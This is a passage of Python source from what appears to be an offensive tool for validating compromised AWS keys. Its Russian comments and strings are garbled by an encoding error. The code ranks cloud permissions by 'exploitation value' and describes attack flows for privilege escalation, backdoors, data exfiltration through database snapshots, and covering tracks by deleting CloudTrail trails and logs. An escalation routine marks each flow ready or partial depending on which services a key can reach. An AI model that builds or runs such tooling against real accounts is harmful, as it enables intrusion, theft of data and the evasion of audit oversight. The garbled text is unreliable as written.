                    'ec2_create_image', 'ec2_modify_instance_attribute',
                    'lambda_create_function', 'lambda_update_function_code',
                    'systems_manager_send_command', 'systems_manager_start_session'
                ],
                'description': '–ü–æ–ª–Ω—ã–π –∫–æ–Ω—Ç—Ä–æ–ª—å –Ω–∞–¥ –∏–Ω—Ñ—Ä–∞—Å—Ç—Ä—É–∫—Ç—É—Ä–æ–π',
                'capabilities': [
                    '–°–æ–∑–¥–∞–Ω–∏–µ –Ω–æ–≤—ã—Ö —Å–µ—Ä–≤–µ—Ä–æ–≤',
                    '–°–æ–∑–¥–∞–Ω–∏–µ –≥—Ä—É–ø–ø –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏',
                    '–°–æ–∑–¥–∞–Ω–∏–µ –æ–±—Ä–∞–∑–æ–≤ AMI',
                    '–ò–∑–º–µ–Ω–µ–Ω–∏–µ –Ω–∞—Å—Ç—Ä–æ–µ–∫ —Å–µ—Ä–≤–µ—Ä–æ–≤',
                    '–í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –∫–æ–º–∞–Ω–¥ –Ω–∞ –≤—Å–µ—Ö —Å–µ—Ä–≤–µ—Ä–∞—Ö',
                    '–ü–æ–ª–Ω—ã–π –∫–æ–Ω—Ç—Ä–æ–ª—å –∏–Ω—Ñ—Ä–∞—Å—Ç—Ä—É–∫—Ç—É—Ä—ã'
                ]
            }
        }
        
        # –ü—Ä–æ–≤–µ—Ä—è–µ–º –∫–∞–∫–∏–µ —ç—Å–∫–∞–ª–∞—Ü–∏–∏ –¥–æ—Å—Ç—É–ø–Ω—ã
        for flow_name, flow_info in escalation_definitions.items():
            required_services = flow_info['required_services']
            available_services = [s for s in required_services if s in accessible_services]
            
            if len(available_services) == len(required_services):
                # –í—Å–µ —Å–µ—Ä–≤–∏—Å—ã –¥–æ—Å—Ç—É–ø–Ω—ã
                escalation_flows[flow_name] = {
                    'emoji': flow_info['emoji'],
                    'description': flow_info['description'],
                    'capabilities': flow_info['capabilities'],
                    'status': 'READY'
                }
            elif len(available_services) > 0:
                # –ß–∞—Å—Ç–∏—á–Ω–æ –¥–æ—Å—Ç—É–ø–Ω–æ
                escalation_flows[flow_name] = {
                    'emoji': flow_info['emoji'],
                    'description': f"{flow_info['description']} (—á–∞—Å—Ç–∏—á–Ω–æ –¥–æ—Å—Ç—É–ø–Ω–æ)",
                    'capabilities': flow_info['capabilities'][:2],  # –ü–æ–∫–∞–∑—ã–≤–∞–µ–º —Ç–æ–ª—å–∫–æ –ø–µ—Ä–≤—ã–µ 2 –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç–∏
                    'status': 'PARTIAL'
                }
        
        return escalation_flows

# ============================================================================
# AWS KEY VALIDATOR CLASS
# ============================================================================

class AWSKeyValidator:
    """–ö–ª–∞—Å—Å –¥–ª—è –≤–∞–ª–∏–¥–∞—Ü–∏–∏ AWS –∫–ª—é—á–µ–π"""
    
    def __init__(self):
        self.region = "us-east-1"
        
        # üîÑ –ê–î–ê–ü–¢–ò–í–ù–´–ï –¢–ê–ô–ú–ê–£–¢–´ - –î–∏–Ω–∞–º–∏—á–µ—Å–∫–∏–µ –Ω–∞—Å—Ç—Ä–æ–π–∫–∏
        self.base_timeout = 3  # –ë–∞–∑–æ–≤—ã–π —Ç–∞–π–º–∞—É—Ç –¥–ª—è –±—ã—Å—Ç—Ä—ã—Ö –æ–ø–µ—Ä–∞—Ü–∏–π
        self.critical_timeout = 15  # –¢–∞–π–º–∞—É—Ç –¥–ª—è –∫—Ä–∏—Ç–∏—á–µ—Å–∫–∏—Ö –æ–ø–µ—Ä–∞—Ü–∏–π
        self.max_timeout = 30  # –ú–∞–∫—Å–∏–º–∞–ª—å–Ω—ã–π —Ç–∞–π–º–∞—É—Ç
        self.retry_attempts = 3  # –ö–æ–ª–∏—á–µ—Å—Ç–≤–æ –ø–æ–ø—ã—Ç–æ–∫
        self.backoff_multiplier = 1.5  # –ú–Ω–æ–∂–∏—Ç–µ–ª—å –¥–ª—è —ç–∫—Å–ø–æ–Ω–µ–Ω—Ü–∏–∞–ª—å–Ω–æ–π –∑–∞–¥–µ—Ä–∂–∫–∏
        
        # –ö—ç—à –¥–ª—è —Ä–µ–∑—É–ª—å—Ç–∞—Ç–æ–≤ –ø—Ä–æ–≤–µ—Ä–æ–∫
        self.service_cache = {}
        self.cache_ttl = 300  # TTL –∫—ç—à–∞ –≤ —Å–µ–∫—É–Ω–¥–∞—Ö (5 –º–∏–Ω—É—Ç)
        
        # –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞ –ø—Ä–æ–∏–∑–≤–æ–¥–∏—Ç–µ–ª—å–Ω–æ—Å—Ç–∏
        self.performance_stats = {
            'total_requests': 0,
            'successful_requests': 0,
            'failed_requests': 0,
            'avg_response_time': 0,
            'service_response_times': {}
        }
        
        # –û–ø–∏—Å–∞–Ω–∏—è —Å–µ—Ä–≤–∏—Å–æ–≤ –¥–ª—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
        # –û–±–Ω–æ–≤–ª–µ–Ω–Ω—ã–µ –æ–ø–∏—Å–∞–Ω–∏—è —Å–µ—Ä–≤–∏—Å–æ–≤ —Å —É—á–µ—Ç–æ–º –ø—Ä–∏–æ—Ä–∏—Ç–µ—Ç–æ–≤ (2025)
        self.service_descriptions = {
            # üî¥ –ö–†–ò–¢–ò–ß–ï–°–ö–ò–ï WRITE –û–ü–ï–†–ê–¶–ò–ò - –ú–∞–∫—Å–∏–º–∞–ª—å–Ω–∞—è —É–≥—Ä–æ–∑–∞
            'iam_create_user': '—Å–æ–∑–¥–∞–Ω–∏–µ –Ω–æ–≤—ã—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π —Å –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–∏–≤–Ω—ã–º–∏ –ø—Ä–∞–≤–∞–º–∏',
            'iam_create_role': '—Å–æ–∑–¥–∞–Ω–∏–µ —Ä–æ–ª–µ–π –¥–ª—è –ø—Ä–∏–Ω—è—Ç–∏—è —Å –ø–æ–ª–Ω—ã–º–∏ –ø—Ä–∞–≤–∞–º–∏',
            'iam_attach_user_policy': '–ø—Ä–∏–∫—Ä–µ–ø–ª–µ–Ω–∏–µ –ø–æ–ª–∏—Ç–∏–∫ —Å –ø–æ–ª–Ω—ã–º–∏ –ø—Ä–∞–≤–∞–º–∏ –∫ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è–º',
            'iam_attach_role_policy': '–ø—Ä–∏–∫—Ä–µ–ø–ª–µ–Ω–∏–µ –ø–æ–ª–∏—Ç–∏–∫ —Å –ø–æ–ª–Ω—ã–º–∏ –ø—Ä–∞–≤–∞–º–∏ –∫ —Ä–æ–ª—è–º',
            'iam_create_access_key': '—Å–æ–∑–¥–∞–Ω–∏–µ –∫–ª—é—á–µ–π –¥–æ—Å—Ç—É–ø–∞ –¥–ª—è –Ω–æ–≤—ã—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π',
            'iam_put_user_policy': '—Å–æ–∑–¥–∞–Ω–∏–µ inline –ø–æ–ª–∏—Ç–∏–∫ –¥–ª—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π —Å –ø–æ–ª–Ω—ã–º–∏ –ø—Ä–∞–≤–∞–º–∏',
            'iam_create_login_profile': '—Å–æ–∑–¥–∞–Ω–∏–µ –ø–∞—Ä–æ–ª–µ–π –¥–ª—è –∫–æ–Ω—Å–æ–ª—å–Ω–æ–≥–æ –¥–æ—Å—Ç—É–ø–∞ –∫ AWS',
            'iam_update_login_profile': '–∏–∑–º–µ–Ω–µ–Ω–∏–µ –ø–∞—Ä–æ–ª–µ–π –∫–æ–Ω—Å–æ–ª—å–Ω–æ–≥–æ –¥–æ—Å—Ç—É–ø–∞ –∫ AWS',
            'iam_pass_role': '–ø–µ—Ä–µ–¥–∞—á–∞ —Ä–æ–ª–µ–π –≤ —Å–µ—Ä–≤–∏—Å—ã –¥–ª—è —ç—Å–∫–∞–ª–∞—Ü–∏–∏ —á–µ—Ä–µ–∑ Lambda/EC2',
            'iam_put_role_policy': '—Å–æ–∑–¥–∞–Ω–∏–µ inline –ø–æ–ª–∏—Ç–∏–∫ –¥–ª—è —Ä–æ–ª–µ–π —Å –ø–æ–ª–Ω—ã–º–∏ –ø—Ä–∞–≤–∞–º–∏',
            'iam_update_assume_role_policy': '–∏–∑–º–µ–Ω–µ–Ω–∏–µ trust policy —Ä–æ–ª–µ–π –¥–ª—è —Ä–∞—Å—à–∏—Ä–µ–Ω–∏—è –¥–æ—Å—Ç—É–ø–∞',
            'sts_assume_role': '–ø—Ä–∏–Ω—è—Ç–∏–µ —Ä–æ–ª–µ–π —Å –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–∏–≤–Ω—ã–º –¥–æ—Å—Ç—É–ø–æ–º',
            'secrets_manager_create_secret': '—Å–æ–∑–¥–∞–Ω–∏–µ —Å–µ–∫—Ä–µ—Ç–æ–≤ –¥–ª—è —Ö—Ä–∞–Ω–µ–Ω–∏—è –∫–æ–º–ø—Ä–æ–º–µ—Ç–∏—Ä—É—é—â–∏—Ö –¥–∞–Ω–Ω—ã—Ö',
            'secrets_manager_update_secret': '–æ–±–Ω–æ–≤–ª–µ–Ω–∏–µ —Å—É—â–µ—Å—Ç–≤—É—é—â–∏—Ö —Å–µ–∫—Ä–µ—Ç–æ–≤ —Å –Ω–æ–≤—ã–º–∏ –¥–∞–Ω–Ω—ã–º–∏',
            'secrets_manager_delete_secret': '—É–¥–∞–ª–µ–Ω–∏–µ —Å–µ–∫—Ä–µ—Ç–æ–≤ –¥–ª—è —Å–æ–∫—Ä—ã—Ç–∏—è —Å–ª–µ–¥–æ–≤ –∞—Ç–∞–∫–∏',
            'secrets_manager_restore_secret': '–≤–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏–µ —É–¥–∞–ª–µ–Ω–Ω—ã—Ö —Å–µ–∫—Ä–µ—Ç–æ–≤',
            'secrets_manager_rotate_secret': '—Ä–æ—Ç–∞—Ü–∏—è —Å–µ–∫—Ä–µ—Ç–æ–≤',
            's3_put_object': '–∑–∞–≥—Ä—É–∑–∫–∞ —Ñ–∞–π–ª–æ–≤ –≤ S3 –¥–ª—è —Å–æ–∑–¥–∞–Ω–∏—è backdoor',
            's3_create_bucket': '—Å–æ–∑–¥–∞–Ω–∏–µ –Ω–æ–≤—ã—Ö S3 –±–∞–∫–µ—Ç–æ–≤ –¥–ª—è —Ö—Ä–∞–Ω–µ–Ω–∏—è –¥–∞–Ω–Ω—ã—Ö',
            's3_delete_bucket': '—É–¥–∞–ª–µ–Ω–∏–µ S3 –±–∞–∫–µ—Ç–æ–≤ –¥–ª—è —Å–æ–∫—Ä—ã—Ç–∏—è —Å–ª–µ–¥–æ–≤ –∞—Ç–∞–∫–∏',
            's3_get_object': '—Å–∫–∞—á–∏–≤–∞–Ω–∏–µ —Ñ–∞–π–ª–æ–≤ (READ –æ–ø–µ—Ä–∞—Ü–∏—è)',
            's3_get_object_acl': '–ø–æ–ª—É—á–µ–Ω–∏–µ ACL –æ–±—ä–µ–∫—Ç–æ–≤',
            's3_put_object_acl': '–∏–∑–º–µ–Ω–µ–Ω–∏–µ ACL –æ–±—ä–µ–∫—Ç–æ–≤',
            's3_put_bucket_policy': '–∏–∑–º–µ–Ω–µ–Ω–∏–µ –ø–æ–ª–∏—Ç–∏–∫ –±–∞–∫–µ—Ç–æ–≤',
            's3_put_bucket_acl': '–∏–∑–º–µ–Ω–µ–Ω–∏–µ ACL –±–∞–∫–µ—Ç–æ–≤',
            'ec2_run_instances': '—Å–æ–∑–¥–∞–Ω–∏–µ –Ω–æ–≤—ã—Ö EC2 –∏–Ω—Å—Ç–∞–Ω—Å–æ–≤ –¥–ª—è –∫–æ–Ω—Ç—Ä–æ–ª—è –∏–Ω—Ñ—Ä–∞—Å—Ç—Ä—É–∫—Ç—É—Ä—ã',
            'ec2_create_key_pair': '—Å–æ–∑–¥–∞–Ω–∏–µ SSH –∫–ª—é—á–µ–π –¥–ª—è –¥–æ—Å—Ç—É–ø–∞ –∫ –∏–Ω—Å—Ç–∞–Ω—Å–∞–º',
            'ec2_start_instances': '–∑–∞–ø—É—Å–∫ –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—ã—Ö –∏–Ω—Å—Ç–∞–Ω—Å–æ–≤ –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –¥–æ—Å—Ç—É–ø–∞',
            'ec2_authorize_security_group_ingress': '–æ—Ç–∫—Ä—ã—Ç–∏–µ –ø–æ—Ä—Ç–æ–≤ –≤ security groups –¥–ª—è –¥–æ—Å—Ç—É–ø–∞',
            'ec2_create_security_group': '—Å–æ–∑–¥–∞–Ω–∏–µ –≥—Ä—É–ø–ø –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏',
            'ec2_create_image': '—Å–æ–∑–¥–∞–Ω–∏–µ –æ–±—Ä–∞–∑–æ–≤ AMI',
            'ec2_modify_instance_attribute': '–∏–∑–º–µ–Ω–µ–Ω–∏–µ –∞—Ç—Ä–∏–±—É—Ç–æ–≤ –∏–Ω—Å—Ç–∞–Ω—Å–æ–≤',
            'ec2_modify_volume': '–∏–∑–º–µ–Ω–µ–Ω–∏–µ –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–≤ –¥–∏—Å–∫–æ–≤',
            'ec2_create_tags': '–¥–æ–±–∞–≤–ª–µ–Ω–∏–µ —Ç–µ–≥–æ–≤ –∫ —Ä–µ—Å—É—Ä—Å–∞–º',
            'ec2_snapshots': '–ø—Ä–æ—Å–º–æ—Ç—Ä —Å–Ω–∏–º–∫–æ–≤ –¥–∏—Å–∫–æ–≤ –¥–ª—è –∞–Ω–∞–ª–∏–∑–∞ –¥–∞–Ω–Ω—ã—Ö',
            'lambda_update_function_code': '–∏–∑–º–µ–Ω–µ–Ω–∏–µ –∫–æ–¥–∞ Lambda —Ñ—É–Ω–∫—Ü–∏–π –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –ø—Ä–æ–∏–∑–≤–æ–ª—å–Ω–æ–≥–æ –∫–æ–¥–∞',
            'lambda_delete_function': '—É–¥–∞–ª–µ–Ω–∏–µ Lambda —Ñ—É–Ω–∫—Ü–∏–π –¥–ª—è —Å–æ–∫—Ä—ã—Ç–∏—è —Å–ª–µ–¥–æ–≤ –∞—Ç–∞–∫–∏ –∏ –æ—á–∏—Å—Ç–∫–∏',
            'lambda_get_function': '–ø–æ–ª—É—á–µ–Ω–∏–µ –¥–µ—Ç–∞–ª—å–Ω–æ–π –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ —Ñ—É–Ω–∫—Ü–∏—è—Ö –¥–ª—è –∞–Ω–∞–ª–∏–∑–∞ –∏ –ø–ª–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è –∞—Ç–∞–∫',
            'lambda_update_function_configuration': '–∏–∑–º–µ–Ω–µ–Ω–∏–µ –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–∏ —Ñ—É–Ω–∫—Ü–∏–π –¥–ª—è –ø–æ–≤—ã—à–µ–Ω–∏—è –ø—Ä–∏–≤–∏–ª–µ–≥–∏–π –∏ –¥–æ—Å—Ç—É–ø–∞',
            'lambda_add_permission': '–¥–æ–±–∞–≤–ª–µ–Ω–∏–µ —Ä–∞–∑—Ä–µ—à–µ–Ω–∏–π –∫ —Ñ—É–Ω–∫—Ü–∏—è–º –¥–ª—è –≤–Ω–µ—à–Ω–µ–≥–æ –¥–æ—Å—Ç—É–ø–∞ –∏ —ç—Å–∫–∞–ª–∞—Ü–∏–∏',
            'lambda_publish_version': '–ø—É–±–ª–∏–∫–∞—Ü–∏—è –≤–µ—Ä—Å–∏–π —Ñ—É–Ω–∫—Ü–∏–π –¥–ª—è —Å–æ–∑–¥–∞–Ω–∏—è backdoor –∏ –ø–æ—Å—Ç–æ—è–Ω–Ω–æ–≥–æ –¥–æ—Å—Ç—É–ø–∞',
            'lambda_create_layer_version': '—Å–æ–∑–¥–∞–Ω–∏–µ —Å–ª–æ–µ–≤ Lambda –¥–ª—è –≤–Ω–µ–¥—Ä–µ–Ω–∏—è –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–≥–æ –∫–æ–¥–∞ –≤ —Å—É—â–µ—Å—Ç–≤—É—é—â–∏–µ —Ñ—É–Ω–∫—Ü–∏–∏',
            'lambda_create_alias': '—Å–æ–∑–¥–∞–Ω–∏–µ –∞–ª–∏–∞—Å–æ–≤ Lambda',
            'lambda_update_alias': '–æ–±–Ω–æ–≤–ª–µ–Ω–∏–µ –∞–ª–∏–∞—Å–æ–≤ Lambda',
            'lambda_delete_alias': '—É–¥–∞–ª–µ–Ω–∏–µ –∞–ª–∏–∞—Å–æ–≤ Lambda',
            'lambda_get_layer_version': '–ø–æ–ª—É—á–µ–Ω–∏–µ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ —Å–ª–æ—è—Ö',
            'lambda_delete_layer_version': '—É–¥–∞–ª–µ–Ω–∏–µ –≤–µ—Ä—Å–∏–π —Å–ª–æ–µ–≤',
            
            # üî¥ –ö–†–ò–¢–ò–ß–ï–°–ö–ò–ï READ –û–ü–ï–†–ê–¶–ò–ò - –ú–∞–∫—Å–∏–º–∞–ª—å–Ω–∞—è —É–≥—Ä–æ–∑–∞
            'secrets_manager_secrets': '–ø–æ–ª—É—á–µ–Ω–∏–µ –ø–∞—Ä–æ–ª–µ–π, API –∫–ª—é—á–µ–π, —Å–µ—Ä—Ç–∏—Ñ–∏–∫–∞—Ç–æ–≤ (Secrets Manager)',
            's3_objects': '–ø—Ä—è–º–æ–π –¥–æ—Å—Ç—É–ø –∫ –¥–∞–Ω–Ω—ã–º –±–µ–∑ –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ–π –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏ (S3)',
            'systems_manager_commands': '—É–¥–∞–ª–µ–Ω–Ω–æ–µ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –∫–æ–º–∞–Ω–¥ –Ω–∞ –≤—Å–µ—Ö —Å–µ—Ä–≤–µ—Ä–∞—Ö (SSM Commands)',
            'rds_snapshots': '–ø—Ä–æ—Å–º–æ—Ç—Ä —Å–ø–∏—Å–∫–∞ —Å–Ω–∏–º–∫–æ–≤ –±–∞–∑ –¥–∞–Ω–Ω—ã—Ö –¥–ª—è –∞–Ω–∞–ª–∏–∑–∞ –¥–æ—Å—Ç—É–ø–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö (RDS)',
            'rds_create_db_snapshot': '—Å–æ–∑–¥–∞–Ω–∏–µ —Å–Ω–∏–º–∫–æ–≤ –±–∞–∑ –¥–∞–Ω–Ω—ã—Ö –¥–ª—è —ç–∫—Å—Ñ–∏–ª—å—Ç—Ä–∞—Ü–∏–∏ –¥–∞–Ω–Ω—ã—Ö',
            'rds_start_export_task': '—ç–∫—Å–ø–æ—Ä—Ç —Å–Ω–∏–º–∫–æ–≤ RDS –≤ S3 –¥–ª—è —Å–∫–∞—á–∏–≤–∞–Ω–∏—è –¥–∞–Ω–Ω—ã—Ö',
            'rds_copy_db_snapshot': '–∫–æ–ø–∏—Ä–æ–≤–∞–Ω–∏–µ —Å–Ω–∏–º–∫–æ–≤ RDS –¥–ª—è —Å–æ–∑–¥–∞–Ω–∏—è —Ä–µ–∑–µ—Ä–≤–Ω—ã—Ö –∫–æ–ø–∏–π',
            'rds_modify_db_instance': '–∏–∑–º–µ–Ω–µ–Ω–∏–µ –Ω–∞—Å—Ç—Ä–æ–µ–∫ –ë–î',
            'rds_modify_db_cluster': '–∏–∑–º–µ–Ω–µ–Ω–∏–µ –Ω–∞—Å—Ç—Ä–æ–µ–∫ –∫–ª–∞—Å—Ç–µ—Ä–∞ –ë–î',
            'rds_create_db_instance': '—Å–æ–∑–¥–∞–Ω–∏–µ –Ω–æ–≤—ã—Ö –ë–î',
            'rds_create_db_cluster': '—Å–æ–∑–¥–∞–Ω–∏–µ –Ω–æ–≤—ã—Ö –∫–ª–∞—Å—Ç–µ—Ä–æ–≤ –ë–î',
            'systems_manager_parameters': '–ø–æ–ª—É—á–µ–Ω–∏–µ –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–æ–Ω–Ω—ã—Ö —Ñ–∞–π–ª–æ–≤ —Å–µ—Ä–≤–µ—Ä–æ–≤ (SSM Parameters)',
            'systems_manager_send_command': '–æ—Ç–ø—Ä–∞–≤–∫–∞ –∫–æ–º–∞–Ω–¥ –Ω–∞ EC2 –∏–Ω—Å—Ç–∞–Ω—Å—ã –¥–ª—è —É–¥–∞–ª–µ–Ω–Ω–æ–≥–æ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è',
            'systems_manager_start_session': '–∏–Ω—Ç–µ—Ä–∞–∫—Ç–∏–≤–Ω—ã–µ —Å–µ—Å—Å–∏–∏ –Ω–∞ —Å–µ—Ä–≤–µ—Ä–∞—Ö —á–µ—Ä–µ–∑ SSM',
            'systems_manager_terminate_session': '–∑–∞–≤–µ—Ä—à–µ–Ω–∏–µ –∞–∫—Ç–∏–≤–Ω—ã—Ö —Å–µ—Å—Å–∏–π –Ω–∞ —Å–µ—Ä–≤–µ—Ä–∞—Ö',
            'systems_manager_create_document': '—Å–æ–∑–¥–∞–Ω–∏–µ SSM –¥–æ–∫—É–º–µ–Ω—Ç–æ–≤',
            'systems_manager_update_document': '–æ–±–Ω–æ–≤–ª–µ–Ω–∏–µ SSM –¥–æ–∫—É–º–µ–Ω—Ç–æ–≤',
            'systems_manager_delete_document': '—É–¥–∞–ª–µ–Ω–∏–µ SSM –¥–æ–∫—É–º–µ–Ω—Ç–æ–≤',
            
            # üü° –í–´–°–û–ö–ò–ô –ü–†–ò–û–†–ò–¢–ï–¢ - –í—ã—Å–æ–∫–∞—è —ç–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏–æ–Ω–Ω–∞—è —Ü–µ–Ω–Ω–æ—Å—Ç—å
            'ec2_instances': '–ø–æ–ª—É—á–µ–Ω–∏–µ —Å–ø–∏—Å–∫–∞ —Å–µ—Ä–≤–µ—Ä–æ–≤ –∏ –∏—Ö IP –∞–¥—Ä–µ—Å–æ–≤',
            's3_buckets': '–∞–Ω–∞–ª–∏–∑ —Å—Ç—Ä—É–∫—Ç—É—Ä—ã –¥–∞–Ω–Ω—ã—Ö –æ—Ä–≥–∞–Ω–∏–∑–∞—Ü–∏–∏',
            'ec2_volumes': '—Å–æ–∑–¥–∞–Ω–∏–µ —Å–Ω–∏–º–∫–æ–≤ –¥–∏—Å–∫–æ–≤ –¥–ª—è –∞–Ω–∞–ª–∏–∑–∞ –¥–∞–Ω–Ω—ã—Ö',
            'lambda_create_function': '–≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –ø—Ä–æ–∏–∑–≤–æ–ª—å–Ω–æ–≥–æ –∫–æ–¥–∞ –≤ –æ–±–ª–∞–∫–µ',
            'kms_keys': '—Ä–∞—Å—à–∏—Ñ—Ä–æ–≤–∫–∞ –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö',
            'rds_instances': '–ø–æ–ª—É—á–µ–Ω–∏–µ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ –±–∞–∑–∞—Ö –¥–∞–Ω–Ω—ã—Ö',
            'rds_clusters': '–∞–Ω–∞–ª–∏–∑ –∞—Ä—Ö–∏—Ç–µ–∫—Ç—É—Ä—ã –¥–∞–Ω–Ω—ã—Ö',
            
            # üü¢ –°–†–ï–î–ù–ò–ô –ü–†–ò–û–†–ò–¢–ï–¢ - –°—Ä–µ–¥–Ω—è—è —ç–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏–æ–Ω–Ω–∞—è —Ü–µ–Ω–Ω–æ—Å—Ç—å
            'iam_attach_group_policy': '–ø—Ä–∏–∫—Ä–µ–ø–ª–µ–Ω–∏–µ –ø–æ–ª–∏—Ç–∏–∫ —Å –ø–æ–ª–Ω—ã–º–∏ –ø—Ä–∞–≤–∞–º–∏',
            'iam_add_user_to_group': '–¥–æ–±–∞–≤–ª–µ–Ω–∏–µ –≤ –≥—Ä—É–ø–ø—É —Å –≤—ã—Å–æ–∫–∏–º–∏ –ø—Ä–∞–≤–∞–º–∏',
            'lambda_invoke_function': '–≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ Lambda —Ñ—É–Ω–∫—Ü–∏–π',
            'iam_create_group': '—Å–æ–∑–¥–∞–Ω–∏–µ –≥—Ä—É–ø–ø—ã —Å –ø–æ–≤—ã—à–µ–Ω–Ω—ã–º–∏ –ø—Ä–∞–≤–∞–º–∏',
            
            # ‚ö™ –ù–ò–ó–ö–ò–ô –ü–†–ò–û–†–ò–¢–ï–¢ - –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏–æ–Ω–Ω–∞—è —Ä–∞–∑–≤–µ–¥–∫–∞
            'iam_users': '–∞–Ω–∞–ª–∏–∑ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π',
            'lambda_functions': '–∞–Ω–∞–ª–∏–∑ —Å—É—â–µ—Å—Ç–≤—É—é—â–∏—Ö —Ñ—É–Ω–∫—Ü–∏–π',
            
            # –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏–æ–Ω–Ω—ã–µ —Å–µ—Ä–≤–∏—Å—ã
            'iam_groups': '–∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è: –ø—Ä–æ—Å–º–æ—Ç—Ä –≥—Ä—É–ø–ø –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π',
            'ec2_key_pairs': '–∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è: –ø—Ä–æ—Å–º–æ—Ç—Ä SSH –∫–ª—é—á–µ–π',
            'ec2_images': '–∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è: –ø—Ä–æ—Å–º–æ—Ç—Ä –æ–±—Ä–∞–∑–æ–≤ EC2',
            'ec2_security_groups': '–∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è: –ø—Ä–æ—Å–º–æ—Ç—Ä –≥—Ä—É–ø–ø –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏',
            'kms_aliases': '–∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è: –ø—Ä–æ—Å–º–æ—Ç—Ä KMS –∞–ª–∏–∞—Å–æ–≤',
            'kms_create_key': '—Å–æ–∑–¥–∞–Ω–∏–µ –Ω–æ–≤—ã—Ö –∫–ª—é—á–µ–π —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è –¥–ª—è –∫–æ–Ω—Ç—Ä–æ–ª—è –∏ –∞—Ç–∞–∫',
            'kms_put_key_policy': '–∏–∑–º–µ–Ω–µ–Ω–∏–µ –ø–æ–ª–∏—Ç–∏–∫ –∫–ª—é—á–µ–π –¥–ª—è —ç—Å–∫–∞–ª–∞—Ü–∏–∏ –ø—Ä–∏–≤–∏–ª–µ–≥–∏–π',
            'cloudwatch_delete_logs': '—É–¥–∞–ª–µ–Ω–∏–µ –ª–æ–≥–æ–≤ CloudWatch –¥–ª—è —Å–æ–∫—Ä—ã—Ç–∏—è —Å–ª–µ–¥–æ–≤ –∞—Ç–∞–∫–∏',
            'cloudtrail_delete_trail': '—É–¥–∞–ª–µ–Ω–∏–µ CloudTrail —Ç—Ä–µ–π–ª–æ–≤ –¥–ª—è —Å–æ–∫—Ä—ã—Ç–∏—è –∞—É–¥–∏—Ç–∞',
            'cloudtrail_stop_logging': '–æ—Å—Ç–∞–Ω–æ–≤–∫–∞ –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏—è CloudTrail',
            'cloudtrail_put_event_selectors': '–∏–∑–º–µ–Ω–µ–Ω–∏–µ —Å–µ–ª–µ–∫—Ç–æ—Ä–æ–≤ —Å–æ–±—ã—Ç–∏–π CloudTrail',
            'cloudwatch_logs_delete_log_group': '—É–¥–∞–ª–µ–Ω–∏–µ –≥—Ä—É–ø–ø –ª–æ–≥–æ–≤ CloudWatch',
            'cloudwatch_logs_stop_logging': '–æ—Å—Ç–∞–Ω–æ–≤–∫–∞ –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏—è CloudWatch Logs',
            'cloudwatch_logs_put_retention_policy': '–∏–∑–º–µ–Ω–µ–Ω–∏–µ –ø–æ–ª–∏—Ç–∏–∫–∏ —Ö—Ä–∞–Ω–µ–Ω–∏—è –ª–æ–≥–æ–≤',
            'cloudwatch_logs_delete_log_stream': '—É–¥–∞–ª–µ–Ω–∏–µ –ø–æ—Ç–æ–∫–æ–≤ –ª–æ–≥–æ–≤',
        }
        
        # –û–±–Ω–æ–≤–ª–µ–Ω–Ω—ã–µ –≤–µ—Å–∞ —Å–µ—Ä–≤–∏—Å–æ–≤ –Ω–∞ –æ—Å–Ω–æ–≤–µ —Ä–µ–∞–ª—å–Ω–æ–π —ç–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏–æ–Ω–Ω–æ–π —Ü–µ–Ω–Ω–æ—Å—Ç–∏ (2025)
        self.service_scores = {
            # üî¥ –ö–†–ò–¢–ò–ß–ï–°–ö–ò–ï WRITE –û–ü–ï–†–ê–¶–ò–ò - –ú–∞–∫—Å–∏–º–∞–ª—å–Ω–∞—è —É–≥—Ä–æ–∑–∞
